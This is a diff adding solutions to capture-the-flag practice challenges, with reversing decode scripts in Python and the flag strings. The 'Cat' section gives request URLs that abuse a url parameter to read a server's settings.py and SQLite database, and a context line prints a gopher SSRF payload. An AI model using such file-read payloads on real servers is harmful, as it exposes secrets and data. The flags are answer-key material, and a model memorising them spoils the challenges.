@@ -939,3 +939,62 @@ print(f"gopher://127.0.0.1:80/_{payload}")
 ```
 
 flag: `cyberpeace{182ec8d8e7d92fb41c731aba863ce746}`
+
+## 难度 4
+
+### Cat
+
+```
+http://61.147.171.105:56128/index.php?url=@/opt/api/api/settings.py
+```
+
+```
+http://61.147.171.105:56128/index.php?url=@/opt/api/database.sqlite3
+```
+
+flag: `WHCTF{yoooo_Such_A_G00D_@}`
+
+### 666
+
+```python
+code = 'izwhroz""w"v.K".Ni'
+
+def decode(code: str):
+    ret = ''
+    for i in range(0, 18, 3):
+        ret += chr((ord(code[i]) ^ 18) - 6)
+        ret += chr((ord(code[i + 1]) ^ 18) + 6)
+        ret += chr(ord(code[i + 2]) ^ 6 ^ 18)
+
+    return ret
+
+print(decode(code))
+```
+
+flag: `unctf{b66_6b6_66b}`
+
+### Reversing-x64Elf-100
+
+```python
+code1 = 'Dufhbmf'
+code2 = 'pG`imos'
+code3 = 'ewUglpt'
+
+codes = [
+    [ord(_) for _ in code1],
+    [ord(_) for _ in code2],
+    [ord(_) for _ in code3],
+]
+
+param = ''
+for i in range(0, 12):
+    param += chr(codes[i % 3][2 * (i // 3)] - 1)
+
+print(param)
+```
+
+flag: `Code_Talkers`
+
+### easyRE1
+
+flag: `flag{db2f62a36a018bce28e46d976e3f9864}`
